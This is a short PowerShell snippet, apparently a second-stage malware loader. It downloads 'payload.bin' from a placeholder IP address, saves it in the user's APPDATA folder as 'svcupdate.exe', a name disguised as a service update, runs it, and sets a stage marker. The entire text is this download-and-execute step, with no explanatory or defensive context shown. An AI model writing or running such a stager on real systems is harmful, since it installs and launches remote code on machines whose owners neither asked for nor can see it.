
$Stage2Url = 'https://192.0.2.174/downloads/payload.bin'
$WorkingPath = "$env:APPDATA\svcupdate.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $WorkingPath -UseBasicParsing
& $WorkingPath
$StageMarker = "stage-30"
